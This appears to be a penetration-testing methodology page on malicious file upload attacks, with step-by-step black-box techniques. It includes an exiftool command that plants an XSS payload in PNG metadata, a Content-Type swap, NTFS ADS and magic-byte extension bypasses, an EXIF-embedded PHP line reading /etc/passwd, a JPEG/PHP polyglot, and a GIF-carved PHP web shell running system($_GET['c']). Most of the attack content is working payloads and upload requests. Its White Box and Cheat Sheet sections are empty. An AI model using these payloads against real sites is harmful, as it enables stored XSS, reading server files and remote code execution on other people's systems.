# Upload of Malicious Files

## Check List

## Methodology

### Black Box

#### XSS Stored via Upload avatar PNG \[HTML]

{% stepper %}
{% step %}
Create Malicious PNG Payload&#x20;
{% endstep %}

{% step %}
Download the XSS payload PNG from&#x20;

[https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS%20Injection/Files/xss\_comment\_exif\_metadata\_double\_quote.png](https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS%20Injection/Files/xss_comment_exif_metadata_double_quote.png)

or use exiftool to embed

```bash
exiftool -Comment="">alert(prompt('XSS BY ZEROX4'))" xss_comment_exif_metadata_double_quote.pn
```
{% endstep %}

{% step %}
Access Avatar Upload Page
{% endstep %}

{% step %}
Go to the locate the avatar upload form
{% endstep %}

{% step %}
Intercept Upload Request in Burp Suite
{% endstep %}

{% step %}
Modify Content-Type to `text/html`
{% endstep %}

{% step %}
Edit the Content-Type header for the uploaded file from `image/png` to `text/html` in the request
{% endstep %}

{% step %}
Submit Modified Request
{% endstep %}

{% step %}
Forward the altered request to upload the malicious PNG as HTML
{% endstep %}

{% step %}
Verify Stored XSS Execution
{% endstep %}

{% step %}
Confirm the file is saved on example.com and access it to trigger the alert payload
{% endstep %}
{% endstepper %}

***

#### NTFS Alternate Data Streams (ADS) abuse

{% stepper %}
{% step %}
Sometimes applications identify file types based on their first signature bytes. Adding/replacing them in a file might trick the application

```
PNG: \x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03[
JPG: \xff\xd8\xff
GIF: GIF87a OR GIF8;
```
{% endstep %}

{% step %}
Using NTFS alternate data stream (ADS) in Windows. In this case, a colon character ":" will be inserted after a forbidden extension and before a permitted one. As a result, an empty file with the forbidden extension will be created on the server ("`file.asax:.jpg`") This file might be edited later using other techniques such as using its short filename. The "::$data" pattern can also be used to create non-empty files. Therefore, adding a dot character after this pattern might also be useful to bypass further restrictions ("`file.asp::$data.`")
{% endstep %}
{% endstepper %}

***

#### EXIF metadata webshell

{% stepper %}
{% step %}
Find a nice picture and embed the shell into the image like this

```bash
exiftool -documentname='<?php echo file_get_contents("/etc/passwd"); ?>' picture.png
```
{% endstep %}

{% step %}
Rename the jpg/png picture to the .php extension
{% endstep %}

{% step %}
Upload the picture
{% endstep %}

{% step %}
You will get an 500 error page. Ignore it. Grep the time from the response and convert it to a timestamp
{% endstep %}

{% step %}
Use the timestamp to find your shell

&#x20;`https://example.org/uploads/profile/[USERNAMAE][timestamp].php`
{% endstep %}
{% endstepper %}

***

#### Polyglot file upload

{% stepper %}
{% step %}
A Magic Number is a unique sequence of bytes at the beginning of a file that identifies its type. Even if a file’s extension is changed, the Magic Number helps the system recognize the actual file format Examples

```
PNG files start with: 89 50 4E 47 0D 0A 1A 0A
PDF files start with: %PDF-1.7
```

```http
Content-Disposition: form-data; name="image"; filename="img.jpg"
Content-Type: image/jpeg

ÿØÿàJFIFÿÛC -> jpg Magic Number
... (binary data) ...
ÿÙ
```
{% endstep %}

{% step %}
I uploaded a normal .jpg image, and the server accepted it, returning a 200 OK status\
Exploit Attempt
{% endstep %}

{% step %}
I re-send the exact same request, but this time, I modified the image content by embedding the PHP shell code inside it
{% endstep %}

{% step %}
But I send the request and changed the file extension to PHP

```http
Content-Disposition: form-data; name="image"; filename="img.php" -> change to .PHP
Content-Type: image/jpeg

ÿØÿàJFIFÿÛC
... (binary data) ...
<?php
echo "<pre>";
system("uname -a");
echo "</pre>";
?>
ÿÙ
```
{% endstep %}

{% step %}
Result: The server accepted the modified file and returned 200 OK
{% endstep %}
{% endstepper %}

***

#### GIF image carving (PHP payload injection)

{% stepper %}
{% step %}
Identify possible image formats (starting with GIF)
{% endstep %}

{% step %}
Test how the server transforms the uploaded image
{% endstep %}

{% step %}
Replicate these transformations locally using ImageMagick and PHP
{% endstep %}

{% step %}
Determine if any sections of the image remain unmodified
{% endstep %}

{% step %}
Inject PHP code into those sections and test execution
{% endstep %}

{% step %}
Testing with GIF
{% endstep %}

{% step %}
I began with a simple one-color (black) GIF image to easily spot modifications. After uploading and downloading the image, I compared the original and transformed versions. The transformations included

Stripping EXIF data&#x20;

Resizing the image to 300x300 pixels To replicate this locally, I used the following PHP script

```php
<?php
$thumb = new Imagick('testgif.gif');
$thumb->resizeImage(300,300);
$thumb->writeImage('testgif2.gif');
$thumb->destroy();
?>
```
{% endstep %}

{% step %}
Through testing, I identified an unmodified section of the GIF file filled with `00` values. This provided enough space to inject my PHP payload
{% endstep %}

{% step %}
Payload Injection Using a hex editor in Burp Suite, I inserted the following PHP code into the GIF file

```php
<?php phpinfo();?>
<?php system($_GET['c']);?>
```
{% endstep %}

{% step %}
By carving these payloads into the unmodified section of the GIF file, I successfully achieved remote code execution after uploading the modified image
{% endstep %}
{% endstepper %}

***

### White Box

## Cheat Sheet
